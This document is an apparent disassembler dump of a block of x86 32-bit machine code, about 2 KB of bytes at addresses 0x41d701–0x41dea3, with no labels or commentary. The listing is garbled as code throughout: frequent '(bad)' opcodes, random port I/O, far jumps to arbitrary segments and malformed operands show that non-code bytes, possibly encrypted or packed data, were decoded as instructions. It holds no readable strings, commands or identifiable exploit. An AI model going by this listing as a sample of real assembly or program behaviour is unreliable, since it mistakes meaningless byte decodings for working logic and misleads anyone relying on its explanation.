  41d701:	imul   ebx,DWORD PTR [ecx-0x47],0xd438bcb1
  41d708:	aad    0xde
  41d70a:	ret    
  41d70b:	ins    BYTE PTR es:[edi],dx
  41d70c:	pop    ds
  41d70d:	or     esp,eax
  41d70f:	xor    BYTE PTR [ebx-0x71730db2],cl
  41d715:	jne    0x41d6ce
  41d717:	sbb    eax,0xadedc0ee
  41d71c:	leave  
  41d71d:	ficom  WORD PTR [ebp+0x2e]
  41d720:	test   al,0xdd
  41d722:	mov    al,ds:0x827bafd3
  41d727:	gs mov cl,0x55
  41d72a:	cmp    BYTE PTR [eax+esi*2],al
  41d72d:	rol    BYTE PTR [ecx+edi*8],1
  41d730:	(bad)  
  41d731:	adc    ax,0x7362
  41d735:	adc    al,0x41
  41d737:	stos   DWORD PTR es:[edi],eax
  41d738:	scas   eax,DWORD PTR es:[edi]
  41d739:	sub    DWORD PTR [edi+0x6d],ecx
  41d73c:	fdivr  QWORD PTR [ebx-0x49]
  41d73f:	jmp    0x765f:0x7ac0ed79
  41d746:	pop    eax
  41d747:	adc    eax,0x65b9e456
  41d74c:	ss and cl,bl
  41d74f:	scas   al,BYTE PTR es:[edi]
  41d750:	test   BYTE PTR [esi],bl
  41d752:	clc    
  41d753:	and    dl,dl
  41d755:	int3   
  41d756:	inc    esi
  41d757:	fcom   st(2)
  41d759:	lods   eax,DWORD PTR ds:[esi]
  41d75a:	lods   al,BYTE PTR ds:[esi]
  41d75b:	das    
  41d75c:	dec    edx
  41d75d:	inc    ebx
  41d75e:	dec    esi
  41d75f:	clc    
  41d760:	mov    bl,0x3b
  41d762:	test   eax,0x2a203978
  41d767:	mov    eax,ds:0x2ce284e5
  41d76c:	enter  0x7414,0x2c
  41d770:	cs pop ebp
  41d772:	int3   
  41d773:	mov    ebx,0x2f8d47cb
  41d778:	std    
  41d779:	test   eax,0x612f6baa
  41d77e:	sbb    eax,ebp
  41d780:	pop    ebp
  41d781:	cmovns esi,DWORD PTR [ebx+ebx*1+0x7a]
  41d786:	aaa    
  41d787:	xchg   ebx,eax
  41d788:	out    dx,eax
  41d789:	shl    BYTE PTR [eax+ecx*8+0x2d],1
  41d78d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d78e:	or     eax,0x9b50e7b9
  41d793:	xchg   ecx,eax
  41d794:	shl    BYTE PTR [esi-0x652cadfe],0x9
  41d79b:	nop
  41d79c:	jp     0x41d7ff
  41d79e:	mov    ah,0x62
  41d7a0:	xor    al,0x1b
  41d7a2:	jg     0x41d7ce
  41d7a4:	loopne 0x41d770
  41d7a6:	dec    ecx
  41d7a7:	sbb    eax,0x2854e8b7
  41d7ac:	mov    ah,ch
  41d7ae:	jle    0x41d7c1
  41d7b0:	sub    ch,0x16
  41d7b3:	xchg   edx,eax
  41d7b4:	xor    BYTE PTR [ebx-0x47],bh
  41d7b7:	sub    BYTE PTR [edx-0x1c],dh
  41d7ba:	rcr    ah,1
  41d7bc:	out    dx,eax
  41d7bd:	(bad)  
  41d7be:	jbe    0x41d7e7
  41d7c0:	enter  0xdeb2,0xbb
  41d7c4:	lods   al,BYTE PTR ds:[esi]
  41d7c5:	jne    0x41d7cb
  41d7c7:	mov    eax,ds:0xba15dd2b
  41d7cc:	jmp    0x41d7f2
  41d7ce:	add    bh,BYTE PTR [edx+0x71]
  41d7d1:	adc    ch,BYTE PTR [edx+0x23670ea0]
  41d7d7:	push   ds
  41d7d8:	sbb    esi,esi
  41d7da:	xchg   BYTE PTR [eax],bl
  41d7dc:	ret    
  41d7dd:	dec    ecx
  41d7de:	inc    ebp
  41d7df:	enter  0x80a5,0x27
  41d7e3:	push   eax
  41d7e4:	rol    ebx,cl
  41d7e6:	fcom   QWORD PTR [ebp+eiz*4-0x6e]
  41d7ea:	loopne 0x41d7d6
  41d7ec:	mov    eax,0x5ffa1d51
  41d7f1:	xor    al,0xf5
  41d7f3:	pop    edi
  41d7f4:	cmp    BYTE PTR [esi],bl
  41d7f6:	inc    edx
  41d7f7:	jo     0x41d784
  41d7f9:	dec    eax
  41d7fa:	scas   eax,DWORD PTR es:[edi]
  41d7fb:	mov    esp,DWORD PTR [ebp-0x678c7bfd]
  41d801:	aas    
  41d802:	mov    ebp,0x64754b32
  41d807:	and    DWORD PTR [esi-0x69e1492],edi
  41d80d:	fcomp  QWORD PTR [ecx-0x65c81922]
  41d813:	jne    0x41d7b1
  41d815:	out    0xa0,eax
  41d817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d818:	(bad)  
  41d81a:	into   
  41d81b:	pop    esp
  41d81c:	out    0xb7,al
  41d81e:	inc    esi
  41d81f:	out    dx,al
  41d820:	and    eax,DWORD PTR ss:[ebx+0x26cecf1a]
  41d827:	and    eax,0x54cce5f8
  41d82c:	js     0x41d866
  41d82e:	scas   al,BYTE PTR es:[edi]
  41d82f:	pop    ebp
  41d830:	ret    0x55d
  41d833:	adc    al,0x5f
  41d835:	int3   
  41d836:	retf   0xda17
  41d839:	sbb    eax,0x7d665e32
  41d83e:	rol    DWORD PTR [ecx-0x627c13d5],0xc4
  41d845:	xor    bl,ah
  41d847:	push   eax
  41d848:	jg     0x41d7e7
  41d84a:	mov    edx,0xa1c15130
  41d84f:	adc    ebx,eax
  41d851:	int    0x36
  41d853:	lahf   
  41d854:	outs   dx,BYTE PTR ds:[esi]
  41d855:	sbb    DWORD PTR [ecx],0x66
  41d858:	mov    esi,0x25ba9762
  41d85d:	push   cs
  41d85e:	push   cs
  41d85f:	jecxz  0x41d8d2
  41d861:	adc    al,0x93
  41d863:	sbb    eax,0x1bfa6f95
  41d868:	fild   WORD PTR [ecx-0x57d60d28]
  41d86e:	mov    cl,0x62
  41d870:	aaa    
  41d871:	scas   eax,DWORD PTR es:[edi]
  41d872:	and    dh,BYTE PTR [ebp*8-0x73955ddf]
  41d879:	mov    edi,0x3fbc393e
  41d87e:	mov    eax,0xaf4262bf
  41d883:	sbb    al,0x1d
  41d885:	pop    ss
  41d886:	int    0x59
  41d888:	or     eax,DWORD PTR [ecx-0x1b]
  41d88b:	dec    esp
  41d88c:	xchg   edi,eax
  41d88d:	jno    0x41d811
  41d88f:	mov    al,0xfe
  41d891:	and    WORD PTR ds:0x8433d06a,bx
  41d898:	mov    esi,0x9d4bd4a7
  41d89d:	jno    0x41d82e
  41d89f:	adc    DWORD PTR [ecx*8-0x63e43b5b],edi
  41d8a6:	cs gs push edx
  41d8a9:	push   0x5e
  41d8ab:	fstp   DWORD PTR [eax+0x3faec7cc]
  41d8b1:	mov    dl,0x80
  41d8b3:	push   0x52
  41d8b5:	div    DWORD PTR [eax-0x5c5a7e90]
  41d8bb:	mov    cl,ah
  41d8bd:	ins    DWORD PTR es:[edi],dx
  41d8be:	mov    cl,0x74
  41d8c0:	dec    edx
  41d8c1:	mov    eax,ds:0x3fe06385
  41d8c6:	shl    DWORD PTR [ebp+ebp*4-0x2f8fdeef],0x6e
  41d8ce:	loope  0x41d8e1
  41d8d0:	sub    al,0x58
  41d8d2:	ins    BYTE PTR es:[edi],dx
  41d8d3:	cmp    bh,BYTE PTR [eax]
  41d8d5:	jnp    0x41d8eb
  41d8d7:	test   WORD PTR [ecx-0x332d1329],bp
  41d8de:	xchg   ebp,eax
  41d8df:	jne    0x41d8e2
  41d8e1:	pop    edi
  41d8e2:	int3   
  41d8e3:	push   ecx
  41d8e4:	lods   eax,DWORD PTR ds:[esi]
  41d8e5:	aas    
  41d8e6:	pop    ebx
  41d8e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8e8:	mov    esi,0x38f1e752
  41d8ed:	call   0xa848:0x2fd86793
  41d8f4:	fdiv   st,st(1)
  41d8f6:	loop   0x41d8b5
  41d8f8:	jns    0x41d918
  41d8fa:	ins    DWORD PTR es:[edi],dx
  41d8fb:	sub    eax,0x67aa02c8
  41d900:	xor    al,0xc2
  41d902:	and    BYTE PTR [ebp-0xa2d6289],ah
  41d908:	outs   dx,DWORD PTR ds:[esi]
  41d909:	out    0xe2,al
  41d90b:	pop    edx
  41d90c:	mov    dh,0xc1
  41d90e:	xchg   edi,eax
  41d90f:	mov    ebp,0xb3e6e12e
  41d914:	sbb    DWORD PTR [eax-0x3e],ebp
  41d917:	out    0xa8,eax
  41d919:	mov    BYTE PTR [esi-0x7dccc40d],al
  41d91f:	shr    DWORD PTR [eax+0x26bacb5a],0xae
  41d926:	cwde   
  41d927:	iret   
  41d928:	lock push edx
  41d92a:	shl    DWORD PTR [ebp+0x22e0bc54],0xae
  41d931:	or     edi,DWORD PTR [esp+esi*4]
  41d934:	pop    eax
  41d935:	mov    ah,0xe9
  41d937:	pop    esp
  41d938:	jmp    0x72f4:0x6c9411d0
  41d93f:	addr16 inc edx
  41d941:	mov    ebx,0x7667fbe0
  41d946:	sub    DWORD PTR [edx+ebx*8],edx
  41d949:	xchg   ecx,eax
  41d94a:	inc    esi
  41d94b:	add    eax,0x6e9be67
  41d950:	cmp    ch,ah
  41d952:	int    0xa2
  41d954:	(bad)  
  41d955:	in     al,0x50
  41d957:	cmp    BYTE PTR [ebx+0x38f45795],ch
  41d95d:	mov    eax,ds:0xd61019c2
  41d962:	stos   BYTE PTR es:[edi],al
  41d963:	cmp    eax,0xaaba4ecf
  41d968:	xchg   ebx,eax
  41d969:	enter  0xc10c,0x4b
  41d96d:	mov    WORD PTR [edx-0x193d33a2],ds
  41d973:	cwde   
  41d974:	mov    ds:0xe6113b8c,al
  41d979:	xchg   edx,eax
  41d97a:	jge    0x41d93a
  41d97c:	pop    edi
  41d97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d97e:	mov    WORD PTR [edx+0x1d99b8cc],gs
  41d984:	mov    al,0x8e
  41d986:	rcl    DWORD PTR [eax-0x1d488186],0x15
  41d98d:	loope  0x41d96e
  41d98f:	or     al,0xd0
  41d991:	in     eax,0xb1
  41d993:	add    esp,DWORD PTR [edi]
  41d995:	outs   dx,BYTE PTR ds:[esi]
  41d996:	ins    BYTE PTR es:[edi],dx
  41d997:	(bad)  
  41d998:	call   0x203d1316
  41d99d:	dec    esi
  41d99e:	sbb    dh,BYTE PTR [esi+eax*8+0x255b1793]
  41d9a5:	xor    eax,0x306857ce
  41d9aa:	ret    
  41d9ab:	push   edx
  41d9ac:	pop    esi
  41d9ad:	or     DWORD PTR [edi],esp
  41d9af:	aam    0x4d
  41d9b1:	inc    edi
  41d9b2:	test   esi,ebp
  41d9b4:	dec    eax
  41d9b5:	and    esi,0x38
  41d9b8:	inc    ecx
  41d9b9:	sahf   
  41d9ba:	outs   dx,BYTE PTR fs:[esi]
  41d9bc:	inc    esi
  41d9bd:	dec    edi
  41d9be:	fnstcw WORD PTR [ebp+0x142853a9]
  41d9c4:	je     0x41d98e
  41d9c6:	inc    esi
  41d9c7:	arpl   WORD PTR [edx],ax
  41d9c9:	bound  ecx,QWORD PTR [edx-0x5a]
  41d9cc:	(bad)  
  41d9ce:	clc    
  41d9cf:	sub    DWORD PTR [edx-0x3a191b67],esi
  41d9d5:	dec    ecx
  41d9d6:	fsub   DWORD PTR [eax]
  41d9d8:	or     al,BYTE PTR [di-0x25]
  41d9dc:	(bad)  
  41d9dd:	clc    
  41d9de:	cmp    al,0xd9
  41d9e0:	push   ds
  41d9e1:	(bad)  
  41d9e2:	dec    ebp
  41d9e3:	lock fist DWORD PTR [eax-0x384b2de8]
  41d9ea:	adc    al,0xfe
  41d9ec:	mul    DWORD PTR ds:0xf7c4f957
  41d9f2:	(bad)  
  41d9f3:	jmp    0xdfeb:0xa42de0a6
  41d9fa:	push   esi
  41d9fb:	jns    0x41d9a4
  41d9fd:	xchg   BYTE PTR [esi],al
  41d9ff:	dec    ebx
  41da00:	jp     0x41d9d6
  41da02:	and    DWORD PTR [ecx+0x504fef97],ebp
  41da08:	or     esi,DWORD PTR [ecx+0x29]
  41da0b:	xor    esp,DWORD PTR [esi]
  41da0d:	add    BYTE PTR [edi-0x115364e3],dl
  41da13:	mov    ebx,0x41e674ea
  41da18:	pop    eax
  41da19:	repnz shl DWORD PTR [esi-0x24edc6fe],1
  41da20:	xchg   edx,eax
  41da21:	dec    esp
  41da22:	mov    bl,0x17
  41da24:	dec    edi
  41da25:	pop    ss
  41da26:	mov    ah,0x84
  41da28:	push   ds
  41da29:	sub    DWORD PTR [eax],ecx
  41da2b:	mov    cl,cl
  41da2d:	inc    esp
  41da2e:	inc    ecx
  41da2f:	xor    ebp,eax
  41da31:	jno    0x41d9f5
  41da33:	mov    ds:0x71a3d9ad,eax
  41da38:	adc    ecx,DWORD PTR [ebx-0x44eb3294]
  41da3e:	xchg   DWORD PTR [ebx-0x40f0a0d2],ebx
  41da44:	into   
  41da45:	mov    ds:0x65153c48,al
  41da4a:	aam    0x28
  41da4c:	adc    eax,0x3bcd1e93
  41da51:	ja     0x41d9f7
  41da53:	fstp   QWORD PTR [ebx+edi*2]
  41da56:	cmp    eax,0x724aa924
  41da5b:	xchg   BYTE PTR [ebx+ebp*2-0x2cdb492f],dl
  41da62:	jmp    0x41dad3
  41da64:	dec    edi
  41da65:	outs   dx,BYTE PTR ds:[esi]
  41da67:	mov    BYTE PTR [eax+edx*4-0x3fdb84a0],bh
  41da6e:	xchg   esp,eax
  41da6f:	loop   0x41da20
  41da71:	sahf   
  41da72:	scas   al,BYTE PTR es:[edi]
  41da73:	test   eax,0x4ec4954f
  41da78:	sub    BYTE PTR [edi-0x5325f543],dl
  41da7e:	and    eax,0xb973bd1
  41da83:	xchg   edx,eax
  41da84:	(bad)
  41da88:	retf   
  41da89:	(bad)  
  41da8a:	bound  esp,QWORD PTR [ebp+0x62]
  41da8d:	rcl    DWORD PTR [esi+ebp*4],1
  41da90:	das    
  41da91:	mov    ah,0x43
  41da93:	mov    ecx,0x3279df0f
  41da98:	lods   eax,DWORD PTR ds:[esi]
  41da99:	nop
  41da9a:	lods   eax,DWORD PTR ds:[esi]
  41da9b:	fwait
  41da9c:	mov    ah,0x8
  41da9e:	adc    eax,0xb9ee6fc3
  41daa3:	dec    esi
  41daa4:	mov    bh,0xe7
  41daa6:	idiv   DWORD PTR [eax-0x2528af56]
  41daac:	dec    ebp
  41daad:	outs   dx,DWORD PTR ds:[esi]
  41daae:	jl     0x41da53
  41dab0:	cmp    BYTE PTR [edx+ebx*2+0x39c10697],0xff
  41dab8:	or     ebx,DWORD PTR [edx+0x2d7ee087]
  41dabe:	fcmovb st,st(3)
  41dac0:	jge    0x41db27
  41dac2:	loope  0x41daad
  41dac4:	adc    edx,ebp
  41dac6:	add    BYTE PTR [eax-0x78],ah
  41dac9:	inc    ebp
  41daca:	retf   
  41dacb:	arpl   WORD PTR [ebp+0x6762dfa9],di
  41dad1:	or     BYTE PTR [ebp+0x53663b59],al
  41dad7:	ret    
  41dad8:	pushf  
  41dad9:	jmp    0xe485fd48
  41dade:	int    0xa6
  41dae0:	inc    esp
  41dae1:	test   BYTE PTR [esi-0x3098c776],cl
  41dae7:	adc    al,0x65
  41dae9:	jmp    0x41dad6
  41daeb:	xchg   ebx,eax
  41daec:	and    eax,DWORD PTR [ecx-0xb]
  41daef:	clc    
  41daf0:	imul   BYTE PTR [edi-0x21]
  41daf3:	in     eax,dx
  41daf4:	mov    al,ds:0xe0c73ebc
  41daf9:	fmul   st,st(0)
  41dafb:	sub    DWORD PTR [eax+0x3ecdb8df],esi
  41db01:	and    ebx,DWORD PTR [edx]
  41db03:	adc    al,0x3b
  41db05:	or     DWORD PTR [ebp-0x4c8453be],0x4e336f39
  41db0f:	sti    
  41db10:	fdiv   st,st(2)
  41db12:	jb     0x41db85
  41db14:	mov    eax,ds:0xcd41e498
  41db19:	sub    eax,0xe7bcb395
  41db1e:	adc    edi,esi
  41db20:	(bad)  
  41db21:	xchg   ebp,eax
  41db22:	mov    bh,0xf1
  41db24:	fldenv [edx+0x78]
  41db27:	sub    eax,0x83f9d172
  41db2c:	jbe    0x41db81
  41db2e:	pop    ebx
  41db2f:	jl     0x41daf6
  41db31:	(bad)  
  41db32:	mov    bl,0xf0
  41db34:	mov    DWORD PTR [edi+ebx*1-0x72],ecx
  41db38:	js     0x9ce50f81
  41db3e:	ret    
  41db3f:	add    BYTE PTR [eax-0x2e44f6bf],dh
  41db45:	jmp    0x2a66e3fe
  41db4a:	xchg   esp,eax
  41db4b:	mov    ebp,0x3a5a80fc
  41db50:	popf   
  41db51:	inc    esp
  41db52:	add    DWORD PTR [edi],edx
  41db54:	pop    eax
  41db55:	mov    eax,0xe9d57952
  41db5a:	pusha  
  41db5b:	test   BYTE PTR [esi-0x381de5fa],bh
  41db61:	cmp    BYTE PTR [edi],0xf0
  41db64:	dec    esp
  41db65:	jbe    0x41db7b
  41db67:	and    al,0x51
  41db69:	sub    DWORD PTR [ebx],edx
  41db6b:	xchg   esi,eax
  41db6c:	retf   0x2a22
  41db6f:	es push edi
  41db71:	xchg   esi,eax
  41db72:	inc    esi
  41db73:	or     eax,0xccd2e966
  41db78:	jne    0x41db4c
  41db7a:	fnsave [ebx+0x19c3958c]
  41db80:	lods   al,BYTE PTR ds:[esi]
  41db81:	jno    0x41dbcd
  41db83:	adc    BYTE PTR [ebx-0x7b603639],dl
  41db89:	rcl    DWORD PTR ds:0x8e32a49c,0x72
  41db90:	fstp   DWORD PTR [ebx-0x45]
  41db93:	xor    bl,0x2f
  41db96:	les    ecx,FWORD PTR [esi]
  41db98:	ja     0x41dc00
  41db9a:	sti    
  41db9b:	ror    BYTE PTR [ebp-0x12],cl
  41db9e:	les    edi,FWORD PTR [edx]
  41dba0:	and    BYTE PTR [edx+0x39688cca],bl
  41dba6:	imul   esi,DWORD PTR [ebp-0x4de59d0b],0xd338704a
  41dbb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbb1:	dec    ecx
  41dbb2:	idiv   ebp
  41dbb4:	mov    ?,ebp
  41dbb6:	(bad)  
  41dbb7:	jmp    0x41dc0b
  41dbb9:	lea    eax,[esi]
  41dbbb:	mov    bl,0x14
  41dbbd:	mov    al,ds:0x4de3915b
  41dbc2:	sbb    dh,BYTE PTR [esi-0x47]
  41dbc5:	or     eax,0xd6ccb9e7
  41dbca:	nop
  41dbcb:	dec    eax
  41dbcc:	and    ebp,DWORD PTR [edi+ebp*2+0x1d165788]
  41dbd3:	adc    al,0x60
  41dbd5:	jbe    0x41dc45
  41dbd7:	cmp    al,0x61
  41dbd9:	leave  
  41dbda:	mov    ebx,?
  41dbdc:	(bad)  
  41dbdd:	rcl    al,0x4e
  41dbe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbe1:	mov    WORD PTR [ecx+0x43a24afd],ss
  41dbe7:	fcomip st,st(5)
  41dbe9:	ins    DWORD PTR es:[edi],dx
  41dbea:	das    
  41dbeb:	mov    dl,0xb2
  41dbed:	jl     0x41dc25
  41dbef:	loop   0x41dbf7
  41dbf1:	xor    cl,ch
  41dbf3:	mov    ch,0x32
  41dbf5:	mov    BYTE PTR [esi-0x66b10711],0xc8
  41dbfc:	adc    eax,DWORD PTR [edi-0x69f062b3]
  41dc02:	lods   eax,DWORD PTR ds:[esi]
  41dc03:	ja     0x41dc02
  41dc05:	jle    0x41dbf1
  41dc07:	lock daa 
  41dc09:	xor    BYTE PTR [ebx+0x3f73aa24],ch
  41dc0f:	adc    ah,BYTE PTR ds:0x2ac1efe6
  41dc15:	mov    cl,0xf2
  41dc17:	scas   al,BYTE PTR es:[edi]
  41dc18:	sub    al,0x86
  41dc1a:	push   esp
  41dc1b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41dc1d:	push   eax
  41dc1e:	jbe    0x41dbb7
  41dc20:	sbb    eax,0xe55fc247
  41dc25:	test   BYTE PTR [ebx+ebx*2-0x164c021c],bl
  41dc2c:	adc    dh,BYTE PTR [edx-0x5b6ba9d5]
  41dc32:	out    dx,al
  41dc33:	popf   
  41dc34:	or     BYTE PTR [edi+edi*1-0x3d4f1519],al
  41dc3b:	or     al,0x13
  41dc3d:	das    
  41dc3e:	mov    bl,0x9e
  41dc40:	call   0x6ab24633
  41dc45:	sbb    DWORD PTR [edi+0x69],eax
  41dc48:	mov    DWORD PTR [esp+esi*4+0x64644ad9],ecx
  41dc4f:	xchg   esp,eax
  41dc50:	dec    edi
  41dc51:	std    
  41dc52:	and    bh,dh
  41dc54:	js     0x41dc3e
  41dc56:	add    dl,BYTE PTR gs:0xdf4d9200
  41dc5d:	imul   eax,DWORD PTR [edx-0x562f0b68],0xffffffd8
  41dc64:	mov    eax,es
  41dc66:	add    eax,0xff776df3
  41dc6b:	std    
  41dc6c:	mov    ebp,0xe914fb9a
  41dc71:	outs   dx,BYTE PTR ds:[esi]
  41dc72:	test   al,0xf5
  41dc74:	add    al,0x36
  41dc76:	aaa    
  41dc77:	jmp    0x56f2e842
  41dc7c:	test   BYTE PTR [edi+0x2c1fdc80],0x29
  41dc83:	dec    esp
  41dc84:	loopne 0x41dc0d
  41dc86:	ror    dl,cl
  41dc88:	mov    ebx,0x30816964
  41dc8d:	cmc    
  41dc8e:	cs in  al,dx
  41dc90:	mov    esp,0x6dde75bc
  41dc95:	ins    DWORD PTR es:[edi],dx
  41dc96:	mov    dh,0xb1
  41dc98:	or     al,0x99
  41dc9a:	ss cmp eax,0x5e6ad7d9
  41dca0:	in     eax,dx
  41dca1:	out    0x2e,eax
  41dca3:	xor    DWORD PTR [esi+eiz*8+0x63],ecx
  41dca7:	or     bh,dh
  41dca9:	out    dx,al
  41dcaa:	cdq    
  41dcab:	lock mov ch,BYTE PTR [eax-0xe]
  41dcaf:	add    ebx,DWORD PTR [edx-0x3c8cf3de]
  41dcb5:	(bad)
  41dcb8:	dec    edi
  41dcb9:	lock mov eax,DWORD PTR [esi]
  41dcbc:	dec    edi
  41dcbd:	adc    DWORD PTR [edx-0x295beea3],ebx
  41dcc3:	xor    ebx,esp
  41dcc5:	imul   ebx,DWORD PTR [ebx+edx*1],0x19
  41dcc9:	push   ebx
  41dcca:	dec    eax
  41dccb:	xor    DWORD PTR [eax],0xffffff87
  41dcce:	cmp    eax,0xd09cbe92
  41dcd3:	pop    ebx
  41dcd4:	adc    al,dl
  41dcd6:	pop    ebx
  41dcd7:	jge    0x41dd50
  41dcd9:	int    0x19
  41dcdb:	inc    esp
  41dcdc:	sti    
  41dcdd:	int3   
  41dcde:	sbb    cl,BYTE PTR [eax-0x6eccb67b]
  41dce4:	sub    BYTE PTR [ebp-0x10],0xff
  41dce8:	cmp    BYTE PTR [eax-0x3b],ah
  41dceb:	jmp    0x8838:0x53ab5c11
  41dcf2:	dec    ecx
  41dcf3:	xor    eax,0x96c5d6f7
  41dcf8:	fdiv   QWORD PTR [edx+0x201059f8]
  41dcfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcff:	xchg   ecx,eax
  41dd00:	jmp    0x724ada80
  41dd05:	push   ds
  41dd06:	sub    ebx,ebx
  41dd08:	and    al,0xb9
  41dd0a:	pop    esi
  41dd0b:	sub    DWORD PTR [ebx+0x78f65023],eax
  41dd11:	jl     0x41dd92
  41dd13:	cmp    eax,0xd6a22e34
  41dd18:	dec    esp
  41dd19:	mov    ch,0x0
  41dd1b:	dec    ecx
  41dd1c:	outs   dx,DWORD PTR ds:[esi]
  41dd1d:	pop    ss
  41dd1e:	pop    edi
  41dd1f:	mov    ds:0x621487f4,eax
  41dd24:	sbb    al,BYTE PTR [ecx-0xf]
  41dd27:	retf   
  41dd28:	test   al,0xf0
  41dd2a:	sahf   
  41dd2b:	pop    edx
  41dd2c:	in     al,0x80
  41dd2e:	or     ebx,DWORD PTR [eax+0x12]
  41dd31:	(bad)  
  41dd32:	sbb    esp,DWORD PTR [eax]
  41dd34:	sti    
  41dd35:	iret   
  41dd36:	into   
  41dd37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd38:	test   BYTE PTR [esi+eax*8+0x4336f46a],0x48
  41dd40:	clc    
  41dd41:	test   BYTE PTR [ebp+0x9],ch
  41dd44:	call   0x57c301ca
  41dd49:	ds (bad) 
  41dd4b:	(bad)  [ebx+eax*8]
  41dd4e:	or     edi,DWORD PTR ds:[eax+0x7ce00d43]
  41dd55:	xor    dh,BYTE PTR [esi]
  41dd57:	xchg   edx,eax
  41dd58:	and    bh,BYTE PTR [esi+0x256efa90]
  41dd5e:	pop    eax
  41dd5f:	push   ds
  41dd60:	rcl    BYTE PTR [ebx],cl
  41dd62:	push   edx
  41dd63:	rcr    BYTE PTR [ebx+0x29],0x93
  41dd67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd68:	jae    0x41ddc7
  41dd6a:	pop    ecx
  41dd6b:	aad    0x5
  41dd6d:	psubq  mm7,mm1
  41dd70:	inc    ecx
  41dd71:	push   esi
  41dd72:	das    
  41dd73:	aam    0x62
  41dd75:	out    dx,eax
  41dd76:	out    dx,al
  41dd77:	mov    esp,0x500e6211
  41dd7c:	push   ds
  41dd7d:	mov    al,ds:0x84efe856
  41dd82:	jb     0x41dd82
  41dd84:	xchg   ebp,eax
  41dd85:	xor    DWORD PTR [esi+ebp*4-0x5f],esp
  41dd89:	sub    edx,DWORD PTR [ebp-0x7392d1a2]
  41dd8f:	lods   al,BYTE PTR ds:[esi]
  41dd90:	cs out dx,al
  41dd92:	xor    DWORD PTR [ebp-0x4],0xa86e55b4
  41dd99:	mov    al,ds:0x739d2dfd
  41dd9e:	out    0x73,al
  41dda0:	lods   al,BYTE PTR ds:[esi]
  41dda1:	out    0x9f,al
  41dda3:	in     al,0x44
  41dda5:	in     al,dx
  41dda6:	dec    ebx
  41dda7:	jo     0x41dd4b
  41dda9:	xchg   ebp,eax
  41ddaa:	push   es
  41ddab:	pop    ebp
  41ddac:	rcl    esp,0x76
  41ddaf:	data16 jnp 0x41de1b
  41ddb2:	ret    
  41ddb3:	ror    esp,1
  41ddb5:	shl    DWORD PTR [ebx+0x2f],0xeb
  41ddb9:	ins    DWORD PTR es:[edi],dx
  41ddba:	data16 aas 
  41ddbc:	adc    eax,0xde2ea7d3
  41ddc1:	icebp  
  41ddc2:	cmp    al,0x4b
  41ddc4:	dec    eax
  41ddc5:	push   esi
  41ddc6:	ret    
  41ddc7:	int    0x18
  41ddc9:	into   
  41ddca:	sub    ecx,DWORD PTR [esi+0x24021b6b]
  41ddd0:	fist   DWORD PTR [edx]
  41ddd2:	in     eax,dx
  41ddd3:	clc    
  41ddd4:	mov    bh,0xef
  41ddd6:	(bad)  
  41ddd7:	sbb    al,0xca
  41ddd9:	in     eax,0x92
  41dddb:	gs mov ah,0xcc
  41ddde:	(bad)  
  41dddf:	xchg   dx,ax
  41dde1:	or     eax,0x35d561dd
  41dde6:	icebp  
  41dde7:	ds addr16 (bad) 
  41ddea:	aaa    
  41ddeb:	js     0x41ddaf
  41dded:	or     DWORD PTR [eax+0x40],eax
  41ddf0:	les    esi,FWORD PTR [ecx+0x27]
  41ddf3:	mov    edi,0x9fc90ea2
  41ddf8:	lahf   
  41ddf9:	scas   al,BYTE PTR es:[edi]
  41ddfa:	jae    0x41ddb7
  41ddfc:	xor    DWORD PTR [ebx],0xffffff84
  41ddff:	pop    edx
  41de00:	mov    dl,0xc3
  41de02:	sub    di,si
  41de05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de06:	imul   eax,eax,0x90cff68d
  41de0c:	xchg   esi,eax
  41de0d:	cmp    DWORD PTR [ebx-0x4d3f958b],edx
  41de13:	les    edx,FWORD PTR [ebp-0x56]
  41de16:	repnz fnsave [ecx+0x46]
  41de1a:	lods   al,BYTE PTR ds:[esi]
  41de1b:	pop    edi
  41de1c:	cmp    al,0x6b
  41de1e:	mov    edi,0xc5889823
  41de23:	(bad)  
  41de24:	jo     0x41ddbc
  41de26:	outs   dx,BYTE PTR ds:[esi]
  41de27:	add    eax,0x28ed6760
  41de2c:	arpl   WORD PTR [edi],si
  41de2e:	das    
  41de2f:	sbb    BYTE PTR [edi-0x6e],bh
  41de32:	xchg   esp,eax
  41de33:	jb     0x41deaa
  41de35:	in     al,dx
  41de36:	stos   BYTE PTR es:[edi],al
  41de37:	mov    edi,0x12552ae5
  41de3c:	add    bh,ah
  41de3e:	push   ss
  41de3f:	mov    ecx,0x32fbc4ba
  41de44:	mov    eax,0xa3bed765
  41de49:	popa   
  41de4a:	cdq    
  41de4b:	ror    BYTE PTR [esi+0x736c36bb],1
  41de51:	cmp    BYTE PTR [edi-0x2d],bh
  41de54:	sahf   
  41de55:	stos   DWORD PTR es:[edi],eax
  41de56:	addr16 mov dl,0xfa
  41de59:	dec    esp
  41de5a:	add    BYTE PTR [edx],bh
  41de5c:	adc    al,0x88
  41de5e:	xor    dh,BYTE PTR gs:[ebp-0x3a]
  41de62:	out    dx,eax
  41de63:	out    dx,al
  41de64:	lahf   
  41de65:	mov    ds:0x61349857,al
  41de6a:	out    0x91,al
  41de6c:	js     0x41dee0
  41de6e:	jle    0x41de9f
  41de70:	das    
  41de71:	out    0x51,al
  41de73:	mov    ds:0x7d7c38c9,al
  41de78:	sub    BYTE PTR [ebx-0x208a6439],0x37
  41de7f:	(bad)  
  41de80:	lock or dh,BYTE PTR [edi-0x5e]
  41de84:	push   0xffffffc8
  41de86:	xchg   edx,eax
  41de87:	popa   
  41de88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de89:	je     0x41deb5
  41de8b:	mov    BYTE PTR [esi],0x86
  41de8e:	lock add al,0x8d
  41de91:	sub    esp,DWORD PTR ds:0x65ed4273
  41de97:	xchg   DWORD PTR [edx+0x8],esi
  41de9a:	jle    0x41de56
  41de9c:	add    BYTE PTR ds:0xba7d3b82,bl
  41dea2:	push   edi
  41dea3:	xchg   edi,eax
